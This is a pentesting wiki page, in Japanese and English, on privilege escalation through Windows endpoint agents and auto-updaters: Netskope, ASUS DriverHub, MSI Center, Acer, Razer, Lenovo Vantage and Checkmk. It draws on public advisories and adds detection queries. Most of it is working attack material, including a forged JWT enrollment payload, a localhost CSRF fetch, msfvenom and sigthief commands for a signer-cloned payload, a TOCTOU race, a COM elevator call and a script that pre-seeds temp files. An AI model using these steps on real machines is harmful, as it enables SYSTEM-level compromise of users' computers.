# Enterprise Auto-Updaters and Privileged IPC の悪用（例: Netskope, ASUS & MSI）

{{#include ../../banners/hacktricks-training.md}}

このページでは、低摩擦の IPC 面と特権付きの update フローを公開する enterprise endpoint agents と updaters に見られる Windows local privilege escalation chain の一類型を一般化している。代表的な例は Windows < R129 の Netskope Client（CVE-2025-0309）で、低権限ユーザーが attacker-controlled server への enrollment を強制し、その後 SYSTEM service がインストールする malicious MSI を配信できる。

同様の製品に対して再利用できる要点:
- privileged service の localhost IPC を悪用して、attacker server への再 enrollment または reconfiguration を強制する。
- vendor の update endpoints を実装し、rogue Trusted Root CA を配信して、updater を malicious な “signed” package に向ける。
- 弱い signer checks（CN allow-lists）、任意の digest flags、緩い MSI properties を回避する。
- IPC が “encrypted” なら、registry に保存された world-readable な machine identifiers から key/IV を導出する。
- service が caller を image path/process name で制限する場合は、allow-listed process に inject するか、suspended で起動して最小限の thread-context patch で DLL を bootstrap する。

---
## 1) localhost IPC を介して attacker server への enrollment を強制する

多くの agents は、JSON を用いて localhost TCP 経由で SYSTEM service と通信する user-mode UI process を同梱している。

Netskope で観測されたもの:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) backend host（例: AddonUrl）を制御する claims を持つ JWT enrollment token を作る。alg=None を使って signature が不要になるようにする。
2) あなたの JWT と tenant name を使って provisioning command を呼び出す IPC message を送信する:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) サービスが enrollment/config のためにあなたの rogue server にアクセスし始める。例:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- もし caller verification が path/name-based なら、許可リストにある vendor binary から request を発生させる（see §4）。

---
## 2) update channel を hijacking して SYSTEM として code を実行する

client があなたの server と話し始めたら、期待される endpoints を実装し、attacker's MSI に誘導する。典型的な sequence は次のとおり:

1) /v2/config/org/clientconfig → 非常に短い updater interval を持つ JSON config を返す。例えば:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate を返す。サービスはそれを Local Machine Trusted Root store にインストールする。
3) /v2/checkupdate → malicious MSI を指す metadata と fake version を供給する。

現場でよく見られる common checks の bypass:
- Signer CN allow-list: サービスは Subject CN が “netSkope Inc” または “Netskope, Inc.” と一致するかだけ確認する場合がある。あなたの rogue CA はその CN を持つ leaf を発行して MSI に署名できる。
- CERT_DIGEST property: CERT_DIGEST という benign な MSI property を含める。install 時に enforcement はない。
- Optional digest enforcement: config flag（例: check_msi_digest=false）が追加の cryptographic validation を無効化する。

Result: SYSTEM service は
C:\ProgramData\Netskope\stAgent\data\*.msi
からあなたの MSI を install し、arbitrary code を NT AUTHORITY\SYSTEM として実行する。

Patch-bypass の教訓: ベンダーが update source を cryptographically authenticate せず、代わりに “trusted” domains の小さな allow-list だけを設定した場合、traffic を still steer できる vendor-owned redirectors や reverse proxies を探すこと。Netskope の case では、後続の public research により、R129-era の allow-list が `rproxy.goskope.com` 経由でまだ abuse 可能で、そこは attacker-controlled Azure App Service content を proxy していたことが示された。hostname allow-lists は trust boundary ではなく、speed bump と考えるべき。

---
## 3) encrypted IPC requests を forge する (when present)

R127 から、Netskope は IPC JSON を Base64 のように見える encryptData field で wrap していた。reverse すると、key/IV は any user が読める registry values から導出される AES だった:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers は encryption を再現し、standard user から valid な encrypted commands を送信できる。general tip: agent が突然 IPC を “encrypt” し始めたら、material として HKLM 配下の device IDs, product GUIDs, install IDs を探すこと。

---
## 4) IPC caller allow-lists の bypass (path/name checks)

一部の services は、TCP connection の PID を解決し、image path/name を allow-listed vendor binaries（例: stagentui.exe, bwansvc.exe, epdlp.exe）と比較して peer を authenticate しようとする。

実用的な bypass は 2 つ:
- allow-listed process（例: nsdiag.exe）への DLL injection を行い、その中から IPC を proxy する。
- CreateRemoteThread を使わずに allow-listed binary を suspended で spawn し、proxy DLL を bootstrap して driver-enforced tamper rules を満たす（§5 を参照）。

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products は protected processes への handles から dangerous rights を strip するために、minifilter/OB callbacks driver（例: Stadrv）を同梱することが多い:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME を削除
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE に制限

これらの制約を尊重する reliable な user-mode loader:
1) vendor binary を CREATE_SUSPENDED 付きで CreateProcess する。
2) まだ許可されている handle を取得する: process には PROCESS_VM_WRITE | PROCESS_VM_OPERATION、thread handle には THREAD_GET_CONTEXT/THREAD_SET_CONTEXT（または、既知の RIP に code patch するなら THREAD_RESUME だけでもよい）。
3) ntdll!NtContinue（または、早期に必ず mapped される他の thunk）を、あなたの DLL path に対して LoadLibraryW を呼び出し、その後元に戻る tiny stub で上書きする。
4) ResumeThread して in-process で stub を実行させ、DLL を load する。

protected process に対して PROCESS_CREATE_THREAD や PROCESS_SUSPEND_RESUME を使っていない（自分で作成した）ため、driver の policy は満たされる。

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) は rogue CA、malicious MSI signing、必要な endpoints の提供を自動化する: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate。
- UpSkope は custom IPC client で、任意の（optionally AES-encrypted）IPC messages を生成し、allow-listed binary から起動したように見せる suspended-process injection を含む。

## 7) Fast triage workflow for unknown updater/IPC surfaces

新しい endpoint agent や motherboard “helper” suite に直面したとき、次の quick workflow で privesc target として有望かどうかをすぐに判断できる:

1) loopback listeners を列挙し、vendor processes に対応付ける:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) 候補の named pipes を列挙する:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) plugin-based IPC servers が使用する registry-backed routing data を収集する:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) まず user-mode client から endpoint 名、JSON key、command ID を抽出する。packed Electron/.NET frontends は頻繁に完全な schema を漏えいさせる:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) 実際の trust predicate を探せ、最終的にプロセスを起動する code path だけではなく:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
優先して探すべきパターン:
- `CryptQueryObject`/certificate parsing に `WinVerifyTrust` がない場合、通常は「certificate が存在する」ことを「certificate が trusted である」こととして扱っており、certificate cloning やその他の fake-signer trick を可能にします。
- `Origin`, `Referer`, download URLs, process names, signer CN に対する substring/suffix チェックは authentication ではありません。`contains(".vendor.com")` は、攻撃者が制御する lookalike domains で通常 exploitable です。
- 低権限の GUI が「the file is trusted」と判断し、SYSTEM broker がその結果をそのまま消費するだけなら、client-side DLL/JS を patch もしくは reimplement するだけで boundary を完全に bypass できることがよくあります（Razer-style split validation）。
- broker が payload を `%TEMP%`/`C:\Windows\Temp` にコピーし、その後その path から validate したり schedule したりするなら、直ちに TOCTOU replacement windows と、より弱い checks を持つ alternate `ExecuteTask()` wrappers を公開する sibling plugin modules を test してください。

named-pipe が多い target では、PipeViewer は protocol を深く reverse する前に weak DACLs と remotely reachable pipes を素早く見つけるのに役立ちます。

target が caller を PID, image path, process name だけで authenticate しているなら、それは boundary ではなく speed bump とみなしてください。legitimate client に inject するか、allow-listed process から connection を作るだけで server の checks を満たせることが多いです。named pipes に関しては、[client impersonation and pipe abuse についてのこのページ](named-pipe-client-impersonation.md) が primitive をより詳しく説明しています。

---
## 8) vendor signatures のみで authenticated される modular add-in brokers (Lenovo Vantage pattern)

探す価値のある新しい variation は **signed-client RPC broker** です。低権限の Lenovo-signed desktop process が SYSTEM service と通信し、service は JSON commands を `%ProgramData%` 配下の XML で記述された add-ins に route します。いったん **accepted signed client の内部で** code execution を達成できれば、`runas="system"` の contract はすべて attack surface の一部になります。

Lenovo Vantage の research で観測された高価値 primitive:
- **vendor に signed されているという理由で caller を信頼する**: researchers は、書き込み可能な directory に Lenovo-signed EXE をコピーし、DLL side-load (`profapi.dll`) を満たすことで authenticated context に到達し、service がすでに trust している client 内で arbitrary code を実行しました。
- **manifest-driven attack surface discovery**: add-ins は `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` の下で宣言されます。複数の contract は `SYSTEM` として実行されるため、これらの manifest を列挙すると、broker 自体を reverse するよりも速く本当の privileged verbs が見つかることがよくあります。
- **authenticated channel の背後にある per-command bugs**: trusted client の内部に入ると、public research では update/install verbs の path-traversal + race conditions、privileged settings databases に対する raw-SQL abuse、そして意図した hive の外への書き込みを可能にする substring ベースの registry path checks が見つかりました。

target 上で有用な recon:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Practical takeaway: helper suite が broker を公開していて、まず **caller process** を認証し、その後に数十の plugin/add-in command を dispatch する場合、フロントドアの trust check を bypass しただけで止まってはいけない。manifest/contract table を dump して、各 high-privilege verb を独立して fuzz せよ。authenticated channel には、たいてい複数の second-stage bug が隠れている。

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub は user-mode の HTTP service (ADU.exe) を 127.0.0.1:53000 で提供しており、https://driverhub.asus.com から来る browser call を想定している。origin filter は単純に Origin header と `/asus/v1.0/*` で公開される download URL に対して `string_contains(".asus.com")` を実行するだけである。したがって、`https://driverhub.asus.com.attacker.tld` のような attacker-controlled host はこの check を通過し、JavaScript から state-changing request を送信できる。追加の bypass pattern については [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) を参照。

Practical flow:
1) `.asus.com` を埋め込んだ domain を register し、そこに malicious webpage を host する。
2) `fetch` または XHR を使って、`http://127.0.0.1:53000` 上の privileged endpoint (例: `Reboot`, `UpdateApp`) を呼び出す。
3) handler が期待する JSON body を送信する – packed frontend JS が以下の schema を示している。
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
以下に示す PowerShell CLI でも、Origin ヘッダーを信頼された値に偽装すると成功します:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` は、JSON body で定義された任意の executables をダウンロードし、`C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` にキャッシュする。Download URL の validation も同じ substring logic を再利用しているため、`http://updates.asus.com.attacker.tld:8000/payload.exe` が受け入れられる。ダウンロード後、ADU.exe は PE に signature が含まれていることと、実行前に Subject string が ASUS と一致することだけを確認する。`WinVerifyTrust` も chain validation もない。

この flow を weaponize するには:
1) payload を作成する（例: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) ASUS の signer をそれに clone する（例: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) `pwn.exe` を `.asus.com` の lookalike domain で host し、上の browser CSRF で UpdateApp を trigger する。

Origin と URL の両方の filters が substring-based であり、signer check も string comparison しか行わないため、DriverHub は attacker binary を elevated context で pull して execute する。

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center の SYSTEM service は、各 frame が `4-byte ComponentID || 8-byte CommandID || ASCII arguments` である TCP protocol を expose している。core component (Component ID `0f 27 00 00`) は `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` を ship する。handler は:
1) supplied executable を `C:\Windows\Temp\MSI Center SDK.exe` に copy する。
2) `CS_CommonAPI.EX_CA::Verify` を通じて signature を verify する（certificate subject は “MICRO-STAR INTERNATIONAL, CO., LTD.” と一致し、`WinVerifyTrust` が成功しなければならない）。
3) attacker-controlled arguments 付きで temp file を SYSTEM として実行する scheduled task を create する。

コピーされた file は verification と `ExecuteTask()` の間で lock されていない。attacker は:
- Frame A を、正規の MSI-signed binary を指すように送る（signature check が pass し、task が queue されることを保証）。
- それと race させて、malicious payload を指す repeated Frame B messages を送り、verification 完了直後に `MSI Center SDK.exe` を上書きする。

scheduler が fire すると、元の file を validate したにもかかわらず、上書きされた payload を SYSTEM で execute する。reliable exploitation には、`CMD_AutoUpdateSDK` を spam する 2 つの goroutines/threads を使い、TOCTOU window を勝つ。

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` に loaded されるすべての plugin/DLL は、`HKLM\SOFTWARE\MSI\MSI_CentralServer` の下に保存された Component ID を受け取る。frame の最初の 4 bytes がその component を select し、attacker が commands を arbitrary modules に route できる。
- Plugins は独自の task runners を定義できる。`Support\API_Support.dll` は `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` を expose し、`API_Support.EX_Task::ExecuteTask()` を **signature validation なし** で直接 call する。any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Wireshark で loopback を sniff するか、dnSpy で .NET binaries を instrument すると、Component ↔ command mapping が quickly reveal される。その後 custom Go/ Python clients で frames を replay できる。

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) は `\\.\pipe\treadstone_service_LightMode` を expose し、その discretionary ACL は remote clients を許可する（例: `\\TARGET\pipe\treadstone_service_LightMode`）。command ID `7` に file path を送ると、service の process-spawning routine が invoke される。
- client library は args と一緒に magic terminator byte (113) を serialize する。Frida/`TsDotNetLib` による dynamic instrumentation（instrumentation tips については [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) を参照）では、native handler が `CreateProcessAsUser` を call する前に、この value を `SECURITY_IMPERSONATION_LEVEL` と integrity SID に map していることが示される。
- 113 (`0x71`) を 114 (`0x72`) に swap すると、generic branch に入り、full SYSTEM token を保持しつつ high-integrity SID (`S-1-16-12288`) を set する。spawn された binary は local でも cross-machine でも unrestricted SYSTEM として実行される。
- それに exposed installer flag (`Setup.exe -nocheck`) を組み合わせれば、vendor hardware がなくても lab VM 上で ACC を立ち上げ、pipe を exercise できる。

これらの IPC bugs は、localhost services が mutual authentication（ALPC SIDs、`ImpersonationLevel=Impersonation` filters、token filtering）を enforce しなければならない理由と、各 module の “run arbitrary binary” helper が同じ signer verifications を共有しなければならない理由を示している。

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 は、この family にもう 1 つ有用な pattern を追加した。低権限 user が COM helper に対して `RzUtility.Elevator` 経由で process の launch を request できる一方で、trust decision は privileged boundary 内で robust に enforce されるのではなく、user-mode DLL (`simple_service.dll`) に delegate されている。

Observed exploitation path:
- COM object `RzUtility.Elevator` を instantiate する。
- `LaunchProcessNoWait(<path>, "", 1)` を call して elevated launch を request する。
- public PoC では、request を issue する前に `simple_service.dll` 内の PE-signature gate を patch out し、attacker が選んだ arbitrary executable を launch できるようにしている。

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
一般的な要点: “helper” スイートをリバースするときは、localhost TCP や named pipes だけで止めないこと。`Elevator`、`Launcher`、`Updater`、`Utility` などの名前を持つ COM classes を確認し、その上で privileged service が実際に target binary 自体を検証しているのか、それとも patch 可能な user-mode client DLL が計算した結果を単に信頼しているだけなのかを確かめること。このパターンは Razer を超えて一般化できる: 高権限の broker が低権限側からの allow/deny decision を受け取る split design は、どれも privesc surface の候補になる。


---
## MSI repair 中の予測可能な temp script 実行 (Checkmk Agent / CVE-2024-0670)

一部の Windows agents は、特権操作を `C:\Windows\Temp` に一時的な `.cmd` を書き込み、それを `SYSTEM` として実行することで実装している。ファイル名が予測可能で、かつ service が既存ファイルを安全に再作成しない場合、低権限ユーザーは将来作成される temp file を **read-only** で事前作成でき、privileged process に自分の script ではなく attacker-controlled content を実行させられる。

脆弱な Checkmk Agent build で観測された内容:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: キャッシュ済み agent package の MSI **repair**

実用的な手順:
1. 現在の process ID か、動作中の agent PID から現実的な PID range を見積もる。
2. 短い **ASCII** の `.cmd` payload を書く (`Set-Content -Encoding Ascii` または `cmd.exe` のリダイレクトを使う; batch files では UTF-16 PowerShell output を避ける)。
3. 候補範囲にわたって `C:\Windows\Temp\cmk_all_<PID>_1.cmd` を展開し、各ファイルを read-only に設定する。
4. キャッシュされた MSI の repair をトリガーし、privileged service に temp script の再生成と実行を試みさせる。
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
脆弱な製品が Windows Installer でインストールされている場合、修復をトリガーする前に、`C:\Windows\Installer` 配下のランダムに見えるキャッシュ済み MSI をその製品名に対応付ける:
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operational notes:
- `qwinsta` は、非対話的な WinRM shell から `msiexec /fa` が失敗したときに有用で、既存の desktop/disconnected session が repair を正しくトリガーできるかどうかを把握するのに役立つ。
- このパターンは、world-writable な場所に temp scripts を stage し、後でそれらを SYSTEM として実行する他の endpoint agents や updaters にも一般化できる。予測可能な名前、排他的 create semantics の欠如、そして on demand でトリガーできる repair/update flows をテストすること。

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

2025年6月から2025年12月の間、Notepad++ の update flow を支える hosting infrastructure を侵害した attackers は、選択した victims に対して malicious manifests を選択的に配信した。古い WinGUp ベースの updaters は update authenticity を完全には検証していなかったため、hostile XML response により clients を attacker-controlled URLs にリダイレクトできた。client が信頼された certificate chain とダウンロードされた installer の valid PE signature の両方を強制せずに HTTPS content を受け入れていたため、victims は trojanized な NSIS `update.exe` を取得し実行した。

Operational flow (no local exploit required):
1. **Infrastructure interception**: CDN/hosting を侵害し、attacker metadata を使って malicious download URL を指す update checks に応答する。
2. **Trojanized NSIS**: installer は payload を fetch/execute し、2つの execution chains を悪用する:
- **Bring-your-own signed binary + sideload**: signed な Bitdefender `BluetoothService.exe` を同梱し、その search path に malicious `log.dll` を配置する。signed binary が実行されると、Windows は `log.dll` を sideload し、これが Chrysalis backdoor を decrypt して reflective load する（Warbird-protected + API hashing により static detection を妨害）。
- **Scripted shellcode injection**: NSIS は compiled Lua script を実行し、Win32 APIs（例: `EnumWindowStationsW`）を使って shellcode を inject し、Cobalt Strike Beacon を stage する。

Hardening/detection takeaways for any auto-updater:
- ダウンロードされた installer に対して **certificate + signature verification** を強制する（vendor signer を pin し、不一致の CN/chain は reject する）。update manifest 自体も署名する（例: XMLDSig）。検証されない限り manifest-controlled redirects を block する。
- **BYO signed binary sideloading** を post-download の detection pivot として扱う: signed vendor EXE が canonical install path の外側から DLL 名を load したとき（例: Bitdefender が Temp/Downloads から `log.dll` を load する）、また updater が temp から non-vendor signatures の installer を drop/execute したときに alert する。
- この chain で観測された **malware-specific artifacts** を monitor する（generic pivots として有用）: mutex `Global\Jdhfv_1.0.1`、`%TEMP%` への anomalous な `gup.exe` writes、Lua-driven shellcode injection stages。
- Notepad++ は v8.8.9 以降で WinGUp を強化した: 返される XML は now signed (XMLDSig) となり、新しい builds は transport のみを信頼するのではなく、ダウンロードされた installer に対して certificate + signature verification を強制する。

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

これらのパターンは、署名されていない manifest を受け入れる updater や installer signer の pinning に失敗する updater なら、どれにも一般化できる。つまり、network hijack + malicious installer + BYO-signed sideloading により、“trusted” updates を装った remote code execution が可能になる。

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
